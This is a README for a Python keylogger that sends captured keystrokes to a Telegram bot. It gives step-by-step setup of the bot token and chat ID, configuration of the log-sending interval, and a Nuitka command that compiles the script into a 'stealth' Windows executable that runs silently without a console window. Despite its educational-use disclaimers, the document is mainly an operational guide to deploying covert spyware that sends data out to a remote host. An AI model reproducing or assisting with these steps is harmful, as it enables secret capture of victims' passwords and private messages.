
---

# Keylogger with Telegram Bot Integration

> ⚠️ **Disclaimer**: This project is for **educational and testing purposes only**. Unauthorized use of keyloggers is illegal and unethical. Do **not** use or distribute this software without **explicit permission** from all affected parties.

---

## 📌 Features

- 🔐 Captures keyboard input on your machine.
- 📤 Sends captured logs to your Telegram bot.
- 🧙 Runs silently in the background without showing a terminal window (when compiled).
- Built using **Python** and compiled to **Windows `.exe`** using **Nuitka**.

---

## ⚙️ Requirements

- Python 3.8 – 3.12  
- **Telegram Bot Token** (created via [BotFather](https://core.telegram.org/bots#botfather))  
- **Telegram Chat ID**  

### Python Libraries:

Install the required Python packages:

```bash
pip install pynput requests
```

### Compiler:

Install **Nuitka** to compile the script into a Windows executable:

```bash
pip install nuitka
```

---

## 🤖 Method 1: How to Create a Telegram Bot 

Follow these steps to create a Telegram bot and get your credentials.

### 1️⃣ Create a Telegram Bot via [BotFather](https://t.me/BotFather)

1. Open **Telegram** and search for [**@BotFather**](https://t.me/BotFather).
2. Start a chat with BotFather by typing `/start`.
3. Create a new bot by typing:
   ```
   /newbot
   ```
4. Follow the prompts:
   - Give your bot a name (e.g., `TestKeyloggerBot`).
   - Choose a username that ends with `bot` (e.g., `test_logger_bot`).

5. Once done, BotFather will provide you with a **bot token**:
   ```
   123456789:ABCdefGHIjklMNOpqrSTUvwxYZ
   ```

✅ **Copy this token** — it's your `TELEGRAM_BOT_TOKEN`.

---

### 2️⃣ Get Your Telegram Chat ID

1. Start a conversation with your bot by searching for its username and clicking **Start**.
2. Go to the following URL in your browser:
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```
   Replace `<YOUR_BOT_TOKEN>` with the token you received.

3. You’ll receive a response with the chat ID:
   ```json
   {
     "result": [
       {
         "message": {
           "chat": {
             "id": 123456789,
             "type": "private",
             ...
           }
         }
       }
     ]
   }
   ```

✅ **Copy this `id`** — it’s your `TELEGRAM_CHAT_ID`.

---

## 📁 Setup

1. Clone or download the repository.
2. Open `keylogger.py` and configure:

```python
TELEGRAM_BOT_TOKEN = "your_bot_token"
TELEGRAM_CHAT_ID = "your_chat_id"
LOG_INTERVAL = 1800  # Default is 30 minutes (1800 seconds)
```

3. Save the file.

---

## 🚀 Running the Script (For Testing)

To run the keylogger for testing purposes, execute the following command:

```bash
python keylogger.py
```

The script will begin logging and send updates to your Telegram bot at the configured interval.

---

## 🧙‍♂️ Compile to a Stealth `.exe` (For Testing)

You can compile the script into a Windows `.exe` file using **Nuitka**.

Use this command to compile:

```powershell
& "$env:USERPROFILE\AppData\Roaming\Python\Python312\Scripts\nuitka.cmd" --standalone --onefile --windows-disable-console keylogger.py
```

The executable will be generated in the `keylogger` folder.

---

## ❗ Disclaimer

This software is for **ethical testing and educational purposes only**. Ensure you have **explicit consent** before running this tool on any device or system. Unauthorized use is illegal and may lead to criminal charges. 

The creator assumes **no liability** for misuse of this tool.

---
